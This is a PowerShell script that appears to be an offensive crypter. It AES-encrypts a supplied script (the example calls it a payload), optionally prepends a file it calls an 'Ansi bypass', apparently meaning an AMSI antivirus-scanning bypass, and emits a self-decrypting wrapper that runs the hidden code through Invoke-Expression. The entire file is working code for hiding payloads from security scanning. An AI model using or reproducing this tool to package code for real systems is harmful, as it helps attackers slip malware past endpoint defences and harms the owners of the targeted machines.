<#
.SYNOPSIS
    Encrypts a PowerShell script using AES encryption.
.DESCRIPTION
    Encrypts a PowerShell script using AES encryption.
.PARAMETER ScriptPath
    The path to the script to encrypt.
.PARAMETER AnsiPath
    The path to the Ansi bypass.
.PARAMETER OutputFile
    The path to the output file.
.EXAMPLE
    .\Invoke-AESEncryptionPwsh.ps1 -ScriptPath "C:\Temp\payload.ps1" -AnsiPath "C:\Temp\ansi.ps1"
#>

#--------[Declarations]--------#
[CmdletBinding()]
Param (
    [Parameter(Mandatory=$true)]
    [String]$ScriptPath,
    [Parameter(Mandatory=$false)]
    [String]$AnsiPath,
    [Parameter(Mandatory=$false)]
    [String]$OutputFile
)

#--------[Execution]--------#
# Test if the script exists
if (-not (Test-Path -Path $ScriptPath)) {
    Write-Error "[!] The script '$ScriptPath' does not exist."
    return
} else {
    $ScriptPath = Resolve-Path -Path $ScriptPath
}

# if output file is not specified, use the same name as the input file
if (-not $OutputFile) {
    $OutputFile = $ScriptPath
    $OutputFile = Split-Path -Path $OutputFile -Leaf
    $OutputFile += ".ps1"
    # Test if the output file exists
    if (Test-Path -Path $OutputFile) {
        Write-Error "[!] The output file '$OutputFile' already exists."
        # ask user does he want to overwrite
        $choice = Read-Host "Do you want to overwrite it? (Y/N)"
        if ($choice -eq "N") {
            return
        }
    }
} else {
    # Test if the output file exists
    if (Test-Path -Path $OutputFile) {
        Write-Error "[!] The output file '$OutputFile' already exists."
        $choice = Read-Host "Do you want to overwrite it? (Y/N)"
        if ($choice -eq "N") {
            return
        }
    }
}

# Test if the Ansi bypass exists
if ($AnsiPath) {
    if (-not (Test-Path -Path $AnsiPath)) {
        Write-Error "[!] The Ansi bypass '$AnsiPath' does not exist."
        return
    } else {
        $AnsiPath = Resolve-Path -Path $AnsiPath
    }
}

# Test if the output file is a .ps1 file
if (-not ($OutputFile -like "*.ps1")) {
    Write-Error "[!] The output file '$OutputFile' is not a .ps1 file."
    return
}

# Read the script content
$ScriptContent = Get-Content -Path $ScriptPath -Raw

# Encrypt the script content
$Key = New-Object Byte[] 32
$IV = New-Object Byte[] 16
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($Key)
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($IV)

# Encrypt the binary
$AES = New-Object Security.Cryptography.AesManaged
$AES.Key = $Key
$AES.IV = $IV
$AES.Mode = [Security.Cryptography.CipherMode]::CBC
$AES.Padding = [Security.Cryptography.PaddingMode]::PKCS7
$Encryptor = $AES.CreateEncryptor($AES.Key, $AES.IV)

# Convert the script content to bytes
$ScriptBytes = [System.Text.Encoding]::UTF8.GetBytes($ScriptContent)

# Encrypt the script content
$EncryptedScriptBytes = $Encryptor.TransformFinalBlock($ScriptBytes, 0, $ScriptBytes.Length)

# Convert the encrypted script content to base64
$EncryptedScriptContent = [Convert]::ToBase64String($EncryptedScriptBytes)

# Create the Ansi bypass command
if ($AnsiPath) {
    $AnsiPath = Resolve-Path -Path $AnsiPath
    # Test if the Ansi bypass exists
    if (-not (Test-Path -Path $AnsiPath)) {
        Write-Error "[!] The Ansi bypass "$AnsiPath" does not exist."
        return
    }
    # Read the Ansi bypass string builder
    $AnsiText = [System.IO.File]::ReadAllText($AnsiPath)
} else {
    $AnsiText = ""
}

# Create the output script content
$OutputScriptContent = @"
$AnsiText

function Invoke-AESPwsh {
    `$Key = New-Object Byte[] 32
    `$IV = New-Object Byte[] 16
    `$Key = [System.Convert]::FromBase64String("$([System.Convert]::ToBase64String($Key))")
    `$IV = [System.Convert]::FromBase64String("$([System.Convert]::ToBase64String($IV))")

    # Decrypting the binary
    `$EncryptedBytes = [System.Convert]::FromBase64String("$EncryptedScriptContent")

    `$AesManaged = New-Object Security.Cryptography.AesManaged
    `$AesManaged.Key = `$Key
    `$AesManaged.IV = `$IV
    `$AesManaged.Mode = [Security.Cryptography.CipherMode]::CBC
    `$AesManaged.Padding = [Security.Cryptography.PaddingMode]::PKCS7
    `$Decryptor = `$AesManaged.CreateDecryptor(`$AesManaged.Key, `$AesManaged.IV)

    `$DecryptedBytes = `$Decryptor.TransformFinalBlock(`$EncryptedBytes, 0, `$EncryptedBytes.Length)

    `$DecryptedContent = [System.Text.Encoding]::UTF8.GetString(`$DecryptedBytes)
    return `$DecryptedContent
}
Invoke-Expression -Command `$(Invoke-AESPwsh)
"@

# Write the output script content to the output file
$OutputScriptContent | Out-File -FilePath $OutputFile -Encoding UTF8

# Test if the output file exists
if (Test-Path -Path $OutputFile) {
    Write-Host "[+] The output file '$OutputFile' has been created."
} else {
    Write-Error "[!] The output file '$OutputFile' has not been created."
}